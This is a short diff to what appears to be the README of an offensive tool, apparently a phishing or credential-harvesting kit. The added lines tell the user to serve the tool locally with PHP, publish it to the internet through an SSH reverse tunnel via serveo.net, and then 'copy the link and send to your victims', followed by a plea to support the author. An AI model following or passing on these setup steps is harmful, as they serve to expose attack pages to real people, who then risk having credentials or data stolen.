@@ -35,5 +35,13 @@ apt-get install ngrok -y
 - for see more information
 # another method 
 ```
-
+php -S localhost:9876
 ```
+or
+```
+ssh -R 80:localhost:9876 serveo.net
+```
+- copy the link and send to your victims
+- thank you for install
+- and support me for more tools
+
